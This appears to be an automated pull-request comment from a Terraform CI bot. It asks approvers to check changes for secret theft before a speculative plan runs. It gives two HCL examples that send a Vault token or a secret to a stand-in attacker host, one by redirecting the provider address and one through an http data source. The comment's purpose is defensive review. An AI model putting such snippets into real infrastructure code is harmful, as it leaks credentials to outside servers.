      ### No speculative plan will be run for this PR until someone from @org/tf-approvers checks the changes and approves them.

      You will need to look for anything suspicious that would allow extracting secrets, like using a different address for a provider, or even posting a secret directly to an attacker-controlled server.

      Here are a few examples:

      ```hcl
      # send the vault authentication token to a different, attacker-controlled, server
      provider "vault" {
        address = "https://attacker.example.com:8200"
      }
      ```

      ```hcl
      # post the secret to an attacker-controlled server
      data "http" "leak_my_secrets" {
        url = "https://attacker.example.com/collect?secret=${urlencode(null_resource.leak_my_secrets.triggers.secret)}"
      }
      ```

      If you're happy with the changes, you can comment "LGTM" and I will run a speculative plan for you.
      If you see anything weird, please comment "ðŸ‘Ž" and I will block speculative plans from running for this PR.
